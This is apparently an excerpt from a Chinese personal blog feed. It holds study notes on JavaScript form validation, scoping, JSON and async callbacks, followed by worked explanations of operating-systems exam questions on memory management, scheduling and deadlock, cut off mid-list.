<h2 id="数据验证"><a href="#数据验证" class="headerlink" title="数据验证"></a>数据验证</h2><p><strong>服务端数据验证</strong>是在数据提交到服务器上后再验证。<br><strong>客户端数据验证</strong>是在数据发送到服务器前，在浏览器上完成验证。</p>
<h2 id="HTML-约束验证"><a href="#HTML-约束验证" class="headerlink" title="HTML 约束验证"></a>HTML 约束验证</h2><p>HTML5 新增了 HTML 表单的验证方式：约束验证（constraint validation）。<br>约束验证是表单被提交时浏览器用来实现验证的一种算法。<br>HTML 约束验证基于：</p>
<ul>
<li>HTML 输入属性</li>
<li>CSS 伪类选择器</li>
<li>DOM 属性和方法</li>
</ul>
<h3 id="约束验证-HTML-输入属性"><a href="#约束验证-HTML-输入属性" class="headerlink" title="约束验证 HTML 输入属性"></a>约束验证 HTML 输入属性</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">属性 		描述</span><br><span class="line">disabled	规定输入的元素不可用</span><br><span class="line">max			规定输入元素的最大值</span><br><span class="line">min  		规定输入元素的最小值</span><br><span class="line">pattern		规定输入元素值的模式</span><br><span class="line">required	归档输入元素字段是必需的</span><br><span class="line">type 		规定输入元素的类型</span><br></pre></td></tr></table></figure>
<h3 id="约束验证-CSS-伪类选择器"><a href="#约束验证-CSS-伪类选择器" class="headerlink" title="约束验证 CSS 伪类选择器"></a>约束验证 CSS 伪类选择器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">选择器  		描述</span><br><span class="line">:disabled	选取属性为“disabled”属性的input元素</span><br><span class="line">:invalid	选取无效的input元素</span><br><span class="line">:optional	选择没有“optional”属性的input元素</span><br><span class="line">:valid 		选择有效值的input元素</span><br></pre></td></tr></table></figure>


<h1 id="验证-API"><a href="#验证-API" class="headerlink" title="验证 API"></a>验证 API</h1><h2 id="约束验证-DOM-方法"><a href="#约束验证-DOM-方法" class="headerlink" title="约束验证 DOM 方法"></a>约束验证 DOM 方法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checkValidity()</span><br><span class="line">如果input元素中的数据是合法的返回true，否则返回false。HTMLSelectElement.checkValidity() 会检查元素是否有任何输入约束条件，并且检查值是否符合约束条件。 如果值是不符合约束条件的，浏览器就会在该元素上触发一个可以撤销的 invalid 事件。</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setCustomValidity()</span><br><span class="line">设置input元素的validationMessage属性，用于自定义错误提示信息的方法。使用setCustomValidity设置了自定义提示后，validity.customError就会变为true，checkValidity总是会返回false。如果要重新判断需要取消自定义提示，方式如下：</span><br><span class="line">setCustomValidity(&#x27;&#x27;)</span><br><span class="line">setCustomValidity(null)</span><br><span class="line">setCustomValidity(undefined)</span><br></pre></td></tr></table></figure>

<h2 id="约束验证-DOM-属性"><a href="#约束验证-DOM-属性" class="headerlink" title="约束验证 DOM 属性"></a>约束验证 DOM 属性</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">validity  			布尔属性值，返回input输入值是否合法</span><br><span class="line">validationMessage   浏览器错误提示信息</span><br><span class="line">willValidate		指定input是否需要验证</span><br></pre></td></tr></table></figure>

<h2 id="Validity-属性"><a href="#Validity-属性" class="headerlink" title="Validity 属性"></a>Validity 属性</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">customError		设置为 true, 如果设置了自定义的 validity 信息。</span><br><span class="line">patternMismatch	设置为 true, 如果元素的值不匹配它的模式属性。</span><br><span class="line">rangeOverflow	设置为 true, 如果元素的值大于设置的最大值。</span><br><span class="line">rangeUnderflow	设置为 true, 如果元素的值小于它的最小值。</span><br><span class="line">stepMismatch	设置为 true, 如果元素的值不是按照规定的 step 属性设置。</span><br><span class="line">tooLong			设置为 true, 如果元素的值超过了 maxLength 属性设置的长度。</span><br><span class="line">typeMismatch	设置为 true, 如果元素的值不是预期相匹配的类型。</span><br><span class="line">valueMissing	设置为 true，如果元素 (required 属性) 没有值。</span><br><span class="line">valid			设置为 true，如果元素的值是合法的。</span><br></pre></td></tr></table></figure>


<h1 id="this-关键字"><a href="#this-关键字" class="headerlink" title="this 关键字"></a>this 关键字</h1><p>面向对象语言中 this 表示当前对象的一个引用。<br>但在 JavaScript 中 this 不是固定不变的，它会随着执行环境的改变而改变。</p>
<ul>
<li>在方法中，this 表示该方法所属的对象。</li>
<li>如果单独使用，this 表示全局对象。在浏览器中，window 就是该全局对象为 [object Window]</li>
<li>在函数中，this 表示全局对象。</li>
<li>在函数中，在严格模式下，this 是未定义的(undefined)。</li>
<li>在事件中，this 表示接收事件的元素。</li>
<li>类似 call() 和 apply() 方法可以将 this 引用到任何对象。<br>在下面实例中，当我们使用 person2 作为参数来调用 person1.fullName 方法时, this 将指向 person2, 即便它是 person1 的方法：<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person1 = &#123;</span><br><span class="line">  <span class="attr">fullName</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&quot; &quot;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person2 = &#123;</span><br><span class="line">  <span class="attr">firstName</span>:<span class="string">&quot;John&quot;</span>,</span><br><span class="line">  <span class="attr">lastName</span>: <span class="string">&quot;Doe&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">person1.<span class="property">fullName</span>.<span class="title function_">call</span>(person2);  <span class="comment">// 返回 &quot;John Doe&quot;js</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="let-和-const"><a href="#let-和-const" class="headerlink" title="let 和 const"></a>let 和 const</h1><p>let 声明的变量只在 let 命令所在的代码块内有效。<br>const 声明一个只读的常量，一旦声明，常量的值就不能改变。</p>
<h2 id="JavaScript-块级作用域-Block-Scope"><a href="#JavaScript-块级作用域-Block-Scope" class="headerlink" title="JavaScript 块级作用域(Block Scope)"></a>JavaScript 块级作用域(Block Scope)</h2><p>使用 var 关键字声明的变量不具备块级作用域的特性，它在 {} 外依然能被访问到。<br>ES6 可以使用 let 关键字来实现块级作用域。<br>let 声明的变量只在 let 命令所在的代码块 {} 内有效，在 {} 之外不能访问。</p>
<h2 id="循环作用域"><a href="#循环作用域" class="headerlink" title="循环作用域"></a>循环作用域</h2><p>使用了 var 关键字，它声明的变量是全局的，包括循环体内与循环体外。<br>使用 let 关键字， 它声明的变量作用域只在循环体内，循环体外的变量不受影响。</p>
<h2 id="HTML-代码中使用全局变量"><a href="#HTML-代码中使用全局变量" class="headerlink" title="HTML 代码中使用全局变量"></a>HTML 代码中使用全局变量</h2><p>使用 <strong>var</strong> 关键字声明的全局作用域变量属于 window 对象,使用 <strong>var</strong> 关键字声明的变量在任何地方都可以修改,不能使用 <strong>var</strong> 关键字来重置 <strong>let</strong> 关键字声明的变量<br>使用 <strong>let</strong> 关键字声明的全局作用域变量不属于 window 对象,在相同的作用域或块级作用域中，不能使用 <strong>let</strong> 关键字来重置 <strong>var</strong> 关键字声明的变量,不能使用 <strong>let</strong> 关键字来重置 <strong>let</strong> 关键字声明的变量</p>
<h2 id="变量提升"><a href="#变量提升" class="headerlink" title="变量提升"></a>变量提升</h2><p>JavaScript 中，var 关键字定义的变量可以在使用后声明，也就是变量可以先使用再声明<br>let 和 const 关键字定义的变量则不可以在使用后声明，也就是变量需要先声明再使用。</p>
<h2 id="const-关键字"><a href="#const-关键字" class="headerlink" title="const 关键字"></a>const 关键字</h2><p>const 用于声明一个或多个常量，声明时必须进行初始化，且初始化后值不可再修改<br>const定义常量与使用let 定义的变量相似：</p>
<ul>
<li>二者都是块级作用域</li>
<li>都不能和它所在作用域内的其他变量或函数拥有相同的名称<br>两者还有以下两点区别：</li>
<li>const声明的常量必须初始化，而let声明的变量不用</li>
<li>const 定义常量的值不能通过再赋值修改，也不能再次声明。而 let 定义的变量值可以修改</li>
</ul>
<h3 id="并非真正的常量"><a href="#并非真正的常量" class="headerlink" title="并非真正的常量"></a>并非真正的常量</h3><p>const 的本质: const 定义的变量并非常量，并非不可变，它定义了一个常量引用一个值。使用 const 定义的对象或者数组，其实是可变的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建常量对象</span></span><br><span class="line"><span class="keyword">const</span> car = &#123;<span class="attr">type</span>:<span class="string">&quot;Fiat&quot;</span>, <span class="attr">model</span>:<span class="string">&quot;500&quot;</span>, <span class="attr">color</span>:<span class="string">&quot;white&quot;</span>&#125;;</span><br><span class="line"><span class="comment">// 修改属性:</span></span><br><span class="line">car.<span class="property">color</span> = <span class="string">&quot;red&quot;</span>;</span><br><span class="line"><span class="comment">// 添加属性</span></span><br><span class="line">car.<span class="property">owner</span> = <span class="string">&quot;Johnson&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>但是不能对常量对象或数组重新赋值。</p>
<h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1><p>JSON 是用于存储和传输数据的格式。<br>JSON 通常用于服务端向网页传递数据。</p>
<h2 id="什么是-JSON"><a href="#什么是-JSON" class="headerlink" title="什么是 JSON?"></a>什么是 JSON?</h2><p>JSON 英文全称 JavaScript Object Notation<br>JSON 是一种轻量级的数据交换格式。<br>JSON是独立的语言（JSON 使用 JavaScript 语法，但是 JSON 格式仅仅是一个文本。文本可以被任何编程语言读取及作为数据格式传递。）<br>JSON 易于理解。<br>实例：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;sites&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Runoob&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span><span class="string">&quot;www.runoob.com&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Google&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span><span class="string">&quot;www.google.com&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Taobao&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span><span class="string">&quot;www.taobao.com&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="JSON-语法规则"><a href="#JSON-语法规则" class="headerlink" title="JSON 语法规则"></a>JSON 语法规则</h2><ul>
<li>数据为 键&#x2F;值 对</li>
<li>数据由逗号分隔</li>
<li>大括号保存对象</li>
<li>方括号保存数组</li>
</ul>
<h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JSON.parse()		用于将一个JSON字符串转换为JavaScript对象</span><br><span class="line">JSON.stringify()	用于将JavaScript值转换为JSON字符串</span><br></pre></td></tr></table></figure>


<h1 id="javascript-void-0-含义"><a href="#javascript-void-0-含义" class="headerlink" title="javascript:void(0) 含义"></a>javascript:void(0) 含义</h1><figure class="highlight plaintext"><figcaption><span>中最关键的是void关键字，void是JavaScript中非常重要的关键字，该操作符指定要计算一个表达式但是不返回值。</span></figcaption><table><tr><td class="code"><pre><span class="line">语法格式如下：</span><br><span class="line">```js</span><br><span class="line">void func()</span><br><span class="line">javascript:void func()</span><br><span class="line">或</span><br><span class="line">void(func())</span><br><span class="line">javascript:void(func())</span><br></pre></td></tr></table></figure>
<p>下面的代码创建了一个超级链接，当用户点击以后不会发生任何事。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span>&gt;</span>单击此处什么也不会发生<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>以下实例中，在用户点击链接后显示警告信息：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>点击以下链接查看结果：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(alert(&#x27;Warning!!!&#x27;))&quot;</span>&gt;</span>点我!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="href-x3D-”-”与href-x3D-”javascript-void-0-”的区别"><a href="#href-x3D-”-”与href-x3D-”javascript-void-0-”的区别" class="headerlink" title="href&#x3D;”#”与href&#x3D;”javascript:void(0)”的区别"></a>href&#x3D;”#”与href&#x3D;”javascript:void(0)”的区别</h2><p># 包含了一个位置信息，默认的锚是#top 也就是网页的上端。<br>而javascript:void(0), 仅仅表示一个死链接。<br>在页面很长的时候会使用 # 来定位页面的具体位置，格式为：# + id。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0);&quot;</span>&gt;</span>点我没有反应的!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#pos&quot;</span>&gt;</span>点我定位到指定位置!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;pos&quot;</span>&gt;</span>尾部定位点<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="异步编程"><a href="#异步编程" class="headerlink" title="异步编程"></a>异步编程</h1><h2 id="异步的概念"><a href="#异步的概念" class="headerlink" title="异步的概念"></a>异步的概念</h2><p>异步（Asynchronous, async）是与同步（Synchronous, sync）相对的概念。<br>同步按照代码顺序执行，异步不按照代码顺序执行，异步的执行效率更高。<br>通俗地解释一下异步：异步就是从主线程发射一个子线程来完成任务。</p>
<h2 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h2><p>回调函数就是一个函数，它是在我们启动一个异步任务的时候就告诉它：等你完成了这个任务之后要干什么。这样一来主线程几乎不用关心异步任务的状态了，他自己会善始善终。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;demo1&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;RUNOOB-1!&quot;</span>;</span><br><span class="line">&#125;, <span class="number">3000</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;demo2&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;RUNOOB-2!&quot;</span>;</span><br></pre></td></tr></table></figure>
<h2 id="异步-AJAX"><a href="#异步-AJAX" class="headerlink" title="异步 AJAX"></a>异步 AJAX</h2><p>除了 setTimeout 函数以外，异步回调广泛应用于 AJAX 编程。<br>XMLHttpRequest 常常用于请求来自远程服务器上的 XML 或 JSON 数据。一个标准的 XMLHttpRequest 对象往往包含多个回调</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>没写完，暂时不想写了。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.runoob.com/js/js-tutorial.html">JavaScript教程-runoob</a></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title>OS习题解析</title>
    <url>/2022/12/08/OS%E4%B9%A0%E9%A2%98%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为快到期末考试了，所以需要好好复习，争取考高分吧。</p>
<span id="more"></span>
<h1 id="习题解析"><a href="#习题解析" class="headerlink" title="习题解析"></a>习题解析</h1><ul>
<li>说明：</li>
</ul>
<ol>
<li>不是全部题，只写本人不会的以及需要思考的题。</li>
<li>选择题不写选项，因为懒</li>
<li>试卷来源于打印店</li>
</ol>
<h2 id="选择题"><a href="#选择题" class="headerlink" title="选择题"></a>选择题</h2><ol>
<li><p>若处理器有32位地址，则它的虚拟地址空间为（）字节。<br>解析：<br>虚拟地址对应于物理存储空间的大小，因而可以虚拟出看起来很大的内存空间，这里虚拟地址的地址结构是：<br>31—页号—12—位移量w—0,这里的地址长度正好是操作系统的内存位数，所以可以知道最大寻址为2的32次方b,对应于kb,mb,gb的换算式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2^10b = 1kb</span><br><span class="line">2^20b = 1mb = 1kb*2^10</span><br><span class="line">2^30b = 1gb = 1mb*2^10</span><br><span class="line">这里2^32 = 2^2*1gb  = 4gb</span><br><span class="line">答案：4GB，选B</span><br></pre></td></tr></table></figure>
</li>
<li><p>支持程序浮动的地址转换机制是（）<br>解析：<br>主存储器是可以被处理器直接访问的，处理器是按绝对地址访问主存储器的。<br>为了使用户编制的程序能存放在主存储器的任意区域执行，用户使用逻辑地址编辑程序，即用户使用了逻辑上的主存储器。存储管理必须为用户分配一个物理上的存储空间，于是，就有一个从逻辑空间到物理空间的转换问题。<br>具体地说，是要把逻辑地址转换成绝对地址，把这样的地址转换工作称为重定位。<br>重定位的方式可以有“静态重定位”和“动态重定位”。<br>静态重定位是指在装入一个作业时，把作业中的指令地址和数据地址全部转换成绝对地址。一旦装入则不能改变。<br>动态重定位是指在装入作业时，不进行地址转换，而是直接把作业装入到分配的主存区域中。在作业执行过程中，每当执行一条指令时都有硬件的地址转换机构将指令中的逻辑地址转换为绝对地址。<br>答案：动态重定位，选A</p>
</li>
<li><p>UNIX中的文件系统采用（）<br>解析：<br>按逻辑结构划分，Unix中的文件系统采用流式文件；而按物理结构划分，则是索引文件。<br>答案：流式文件，选D</p>
</li>
<li><p>段页式管理每取一数据，要访问（）次内存。<br>解析：<br>一般需要访问3次以上的内存：<br>第1次是由段表地址寄存器得段表始址后访问段表，由此取出对应段的页表在内存中的地址。<br>第2次则是访问页表得到所要访问的物理地址。<br>第3次才能访问真正需要访问的物理单元。<br>答案：3，选C</p>
</li>
<li><p>文件系统的主要目的是（）<br>解析：<br>文件系统是操作系统用来组织和管理存储设备或磁盘分区上的文件的数据结构和方法；即在存储设备上组织和 管理文件 的方法。 操作系统中负 责管理和存储文件信息的软件机构即为文件管理系统，简称为“文件系统”。文件系统主要由三部分组成：文件系统接口，对对象操纵还有管理的软件集合，对象及属性。<br>从操作系统的角度来看，文件系统是对文件存储设备的空间进行组织、分配，负责文件存储并且对存入的文件进行保护和检索的系统。<br>答案：实现对文件的按名存取，选A</p>
</li>
<li><p>某基于动态分区存储管理的计算机，其主存容量为55MB (初始为空闲)，采用最佳适配(Best Fit)算法，分配和释放的顺序为 ： 分配15MB ，分配30MB，释放15MB，分配8MB，分配6MB ，此时主存中最大空闲分区的大小是()<br>解析：<br>最佳适应算法（BF）：每次为作业分配内存时总是把能满足要求又是最小的空闲分区分配给作业。<br>其主存容量为55mb(初试为空间)，<br>第一步分配15MB以后还有55MB－15MB＝40MB，<br>第二步分配30MB以后还有 40MB－30MB＝10MB，<br>第三步释放15MB以后有两个空闲区15MB，10MB，<br>第四步分配8MB，则空闲区为15MB，2MB，<br>第五步分配 6MB，则空闲区为9MB，2MB。<br>答案：9MB，选B</p>
</li>
<li><p>设计批处理多道系统时，首先要考虑的是（）<br>解析：<br>多道批处理系统：<br>优点：资源利用率大幅提升，系统吞吐量增大<br>缺点：用户响应时间长，没有交互功能。<br>答案：系统效率和吞吐量，选B</p>
</li>
<li><p>进程调度的对象和任务分别是（）<br>解析：<br>CPU调度与执行的基本对象应该为线程。而不是作业。没有从后备作业中选定调度策略上CPU这种说法，进程应该是从就绪状态通过分配内存并调度进入CPU执行状态的。<br>答案：进程，从就绪队列中按一定的调度策略选择一个作业占用CPU。 选C</p>
</li>
<li><p>一种既有利于短小作业又兼顾到长作业的作业调度算法是（）<br>解析：<br>最高响应比优先算法等待时间相同时，要求服务时间愈短，优先权愈高，因而该算法有利于短作业；<br>对于长作业，作业的优先级可以随等待时间的增加而提高，当其等待时间足够长时，其优先级便可升到很高，从而获得处理机。<br>因此该算法即有利于短作业又兼顾到了长作业。<br>答案：最高响应比优先，选C</p>
</li>
<li><p>两个进程合作完成任务。在并发执行中，一个进程要等待其合作伙伴发来消息，或者建立某个条件后再向前执行，这种制约性合作关系被称为进程的（）<br>解析：<br>进程的同步（Synchronization）是解决进程间协作关系( 直接制约关系) 的手段。<br>进程同步指两个以上进程基于某个条件来协调它们的活动。一个进程的执行依赖于另一个协作进程的消息或信号，当一个进程没有得到来自于另一个进程的消息或信号时则需等待，直到消息或信号到达才被唤醒。<br>直接制约关系：指一个进程执行完后，另一个进程才能开始，否则不能开始。<br>答案：同步，选B</p>
</li>
<li><p>当每类资源只有一个个体时，下列说法不正确的是（）<br>A 有环必死锁 	B 死锁必有环 	C 有环不一定死锁 		D 被锁者一定全在环中<br>解析：<br>当每个资源类型只有一个实例，则有环等价于死锁。<br>当存在资源类型有多个实例，则死锁必有环，有环不一定死锁。<br>答案：选C</p>
</li>
<li><p>在现代操作系统中引入了（），从而使并发和共享成为了可能。<br>答案：多道程序，选D</p>
</li>
<li><p>设有3个作业，它们同时到达，运行时间分别为T1，T2和T3，且T1≤T2≤T3，若它们在单处理机系统中按单道运行，采用短作业优先调度算法，则平均周转时间为（）<br>解析：<br>周转时间是：程序从进入系统到完成的时间总量<br>因为是单道的，所以只能一个一个地执行，又是按照最短时间优先执行，因此，执行T1花费总时间是T1,执行T2花费总时间是T1+T2(T1是等待的时间)，执行T3花费的总时间是T1+T2+T3,(T1+T2)是等待的时间，故而，总的平均周转时间是三者之和除以三。<br>答案：T3/3+2*T2/3+T1，选D</p>
</li>
<li><p>若系统中有五台绘图仪，有多个进程均需要使用两台，规定每个进程一次仅允许申请一台，则至多允许（）个进程参与竞争，而不会发生死锁。<br>解析：<br>4个进程，当5个进程的时候如果都同时申请到了1台，就发生死锁了。如果是4个进程，那必然有一个能申请到2台，使资源能够得到释放。<br>答案：4，选D</p>
</li>
<li><p>CPU输出数据速度远远高于打印机的打印速度，为解决矛盾，可采用（）<br>解析：<br>覆盖技术和虚拟技术主要是解决内存不足的问题，当有大文件、程序需要在内存处理时，可以用到覆盖技术和虚拟技术，并行技术主要用于多核的 CPU 或者多 IO 总线上并行处理。<br>答案：缓冲技术，选B</p>
</li>
<li><p>为了允许不同用户的文件具有相同的文件名，通常在文件系统中采用（）<br>答案：多级目录，选B</p>
</li>
<li><p>在可变分区存储管理中，最优适应分配算法要求对空闲区表项按（）排列<br>解析：</p>
</li>
</ol>
<ul>
<li>首次适应算法：按照首址递增的方式来排序。这种方式的特点是：当用户查找空闲区表时，他是从低地址空间开始查找的，所以他是尽可能地先使用低地址空间。但需要较大分区时在高地址空间有较大的满足可能性。</li>
<li>最佳适应法：按照大小递增的方式排序。这种方法的特点是：尽可能地先使用较小的空闲区，保留较大的空闲区。当需要较大分区时有较大的满足可能性。</li>
<li>最坏适应法：空闲区表按大小递减排序。尽可能地先使用较大的空闲区，大空闲区分割后剩下部分还是很大，还能装下较大的程序。所以最坏适应法未必最坏。仅作一次查找就可以找到所要分区。<br>因此在最有适应分配算法中对空闲区表项是按照尺寸从小到大进行排序的。<br>答案：尺寸从小到大，选C</li>
</ul>
<ol start="18">
<li><p>支持程序浮动地址转换机制是（）<br>解析：<br>主存储器是可以被处理器直接访问的，处理器是按绝对地址访问主存储器的。<br>为了使用户编制的程序能存放在主存储器的任意区域执行，用户使用逻辑地址编辑程序，即用户使用了逻辑上的主存储器。<br>存储管理必须为用户分配一个物理上的存储空间，于是，就有一个从逻辑空间到物理空间的转换问题。<br>具体地说，是要把逻辑地址转换成绝对地址，把这样的地址转换工作称为重定位。<br>重定位的方式可以有“静态重定位”和“动态重定位”。<br>静态重定位是指在装入一个作业时，把作业中的指令地址和数据地址全部转换成绝对地址。一旦装入则不能改变。<br>动态重定位是指在装入作业时，不进行地址转换，而是直接把作业装入到分配的主存区域中。在作业执行过程中，每当执行一条指令时都有硬件的地址转换机构将指令中的逻辑地址转换为绝对地址。<br>答案：动态重定位，选A</p>
</li>
<li><p>在可变式分区分配方案中，某一作业完成后，系统收回其主存空间，并与相邻空闲区合并，为此需修改空闲区表，造成空闲区数减1的情况是（）<br>解析：<br>无上邻空闲区，也无下邻空闲区：这时应该是空闲区数加 1<br>有上邻空闲区，但无下邻空闲区；有下邻空闲区，但无上邻空闲区：这时空闲区数不变<br>有下邻空闲区，也有上邻空闲区：这时空闲区数减 1<br>答案：有下邻空闲区，也有上邻空闲区。选D</p>
</li>
<li><p>在下面关于虚拟存储器的叙述中，正确的是（）<br>A 要求程序运行前必须全部装入内存且在运行过程中一直驻留在内存<br>B 要求程序运行前不必全部装入内存且在运行过程中不必一直驻留在内存<br>C 要求程序运行前不必全部装入内存但是在运行过程中必须一直驻留在内存<br>D 要求程序运行前必须全部装入内存但在运行过程中不必一直驻留在内存<br>解析：<br>虚拟存储器基于局部性原理，在程序运行时，可以将程序的一部分装入内存，而将其余部分留在外存，就可以启动程序执行。在程序执行过程中，当访问的信息不在内存时，由操作系统将所需的部分调入内存，然后继续执行。另一方面，操作系统将内存中暂时不使用的内容换出到外存上，从而腾出空间存放将要调入的信息。<br>答案：选B</p>
</li>
<li><p>文件系统中用（）管理文件。<br>解析：<br>文件系统属于操作系统中的一个重要组成部分，负责信息的组织、存储和访问，提供高效快速和方便访问功能。操作系统以文件方式管理计算机软件资源和被管理的文件和数据结构（目录、索引表等）的集合<br>选项A：进程控制块 用来管理进程，如程序计数器、进程状态、CPU暂存器、CPU排班法、存储器管理、输入输出状态等。<br>选项B：目录 实现文件的按名存取管理，系统中保存了海量文件需要组织管理，磁盘可以分为若干个分区，每个分区都包含了存储在分区中的文件的信息，这些信息保存在设备目录中。<br>选项C：外页表 是虚页号与实际地址的对应表，主要功能是实现虚地址到实地址的转化。<br>选项D：软硬件结合的方法 是笼统的计算机硬件和软件的结合，和本题意不太符合。<br>答案：目录，选D</p>
</li>
<li><p>在多进程的并发系统中，肯定不会因竞争（）而产生死锁。<br>解析：</p>
</li>
</ol>
<ul>
<li>竞争资源引起进程死锁<br>当系统中供多个进程共享的资源如打印机、公用队列的等，其数目不足以满足诸进程的需要时，会引起诸进程对资源的竞争而产生死锁。 </li>
<li>可剥夺资源和不可剥夺资源<br>系统中的资源可以分为两类，一类是可剥夺资源，是指某进程在获得这类资源后，该资源可以再被其他进程或系统剥夺。例如，优先权高的进程可以剥夺优先权低的进程的处理机。又如，内存区可由存储器管理程序，把一个进程从一个存储区移到另一个存储区，此即剥夺了该进程原来占有的存储区，甚至可将一进程从内存调到外存上，可见，CPU和主存均属于可剥夺性资源，<strong>可剥夺资源不会产生死锁</strong>。另一类资源是不可剥夺资源，当系统把这类资源分配给某进程后，再不能强行收回，只能在进程用完后自行释放，如磁带机、打印机等。</li>
<li>竞争不可剥夺资源<br>在系统中所配置的不可剥夺资源，由于它们的数量不能满足诸进程运行的需要，会使进程在运行过程中，因争夺这些资源而陷于僵局。例如，系统中只有一台打印机R1和一台磁带机R2，可供进程P1和P2共享。假定PI已占用了打印机R1，P2已占用了磁带机R2，若P2继续要求打印机R1，P2将阻塞；P1若又要求磁带机，P1也将阻塞。于是，在P1和P2之间就形成了僵局，两个进程都在等待对方释放自己所需要的资源，但是它们又都因不能继续获得自己所需要的资源而不能继续推进，从而也不能释放自己所占有的资源，以致进入死锁状态。 </li>
<li>竞争临时资源<br>上面所说的打印机资源属于可顺序重复使用型资源，称为永久资源。还有一种所谓的临时资源，这是指由一个进程产生，被另一个进程使用，短时间后便无用的资源，故也称为消耗性资源，如硬件中断、信号、消息、缓冲区内的消息等，它也可能引起死锁。例如，SI，S2，S3是临时性资源，进程P1产生消息S1，又要求从P3接收消息S3；进程P3产生消息S3，又要求从进程P2处接收消息S2；进程P2产生消息S2，又要求从P1处接收产生的消息S1。如果消息通信按如下顺序进行：<br>P1: ···Relese（S1）；Request（S3）； ···<br>P2: ···Relese（S2）；Request（S1）； ···<br>P3: ···Relese（S3）；Request（S2）； ···<br>并不可能发生死锁。但若改成下述的运行顺序：<br>P1: ···Request（S3）；Relese（S1）；···<br>P2: ···Request（S1）；Relese（S2）； ···<br>P3: ···Request（S2）；Relese（S3）； ···<br>则可能发生死锁。</li>
